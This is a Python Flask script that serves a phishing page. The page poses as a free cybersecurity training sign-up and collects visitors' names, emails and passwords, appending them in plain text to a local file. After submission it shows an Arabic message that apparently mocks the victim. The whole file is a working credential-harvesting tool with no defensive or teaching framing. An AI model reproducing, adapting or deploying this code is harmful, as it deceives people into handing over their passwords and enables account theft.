#user/bin/python
from flask import Flask, request, render_template_string

app = Flask(__name__)

html = '''
<!DOCTYPE html>
<html>
<head>
    <title>Server</title>
    <style>
        body {                                                                                                                                                                               font-family: Arial, sans-serif;
            text-align: center;
        }
        .container {
            width: 50%;
            margin: 40px auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            margin-bottom: 10px;
        }
        .form-group input {
            width: 100%;
            height: 40px;
            padding: 10px;
            border: 1px solid #ccc;
        }
        .btn {
            background-color: #4CAF50;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .btn:hover {
            background-color: #3e8e41;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 style="color: blue;">Welcome to our complimentary Cybersecurity training programs
Earn a recognized certification
To register, kindly complete the form below</h1>
        <form action="/" method="post">
            <div class="form-group">
                <label for="name">Name:</label>
                <input type="text" id="name" name="name">
            </div>
            <div class="form-group">
                <label for="email">Email:</label>
                <input type="email" id="email" name="email">
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password">
            </div>
            <button class="btn" type="submit">Login</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        name = request.form['name']
        email = request.form['email']
        password = request.form['password']
        with open('acontmail.txt', 'a') as f:
            f.write(f'{name},{email},{password}\n')
        return 'تم تخويرك بنجاح!'
    return render_template_string(html)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
